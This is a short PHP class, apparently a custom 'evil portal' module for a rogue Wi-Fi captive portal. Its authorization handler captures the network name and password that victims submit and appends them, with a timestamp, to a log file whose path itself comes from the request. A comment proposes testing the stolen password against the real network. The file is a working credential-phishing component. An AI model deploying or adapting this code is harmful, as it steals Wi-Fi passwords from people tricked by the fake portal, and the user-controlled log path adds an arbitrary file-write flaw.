<?php namespace evilportal;

class MyPortal extends Portal
{
    
    public function handleAuthorization()
    {
        if(isset($_POST['password'])) {
            $line = date('Y-m-d H:i:s') . " - " . $_POST["essid"] . " - " .  $_POST['password'] . "\n";
            file_put_contents($_POST["log"], $line, FILE_APPEND) or die("Could not set in log file");
        }

        //Could put in a check here to test if the password is valid by trying to use the password to connect to the network.
        
        // Call parent to handle basic authorization first
        parent::handleAuthorization();
    }

    public function showSuccess()
    {
        // Calls default success message
        parent::showSuccess();
    }

    public function showError()
    {
        // Calls default error message
        parent::showError();
    }
}
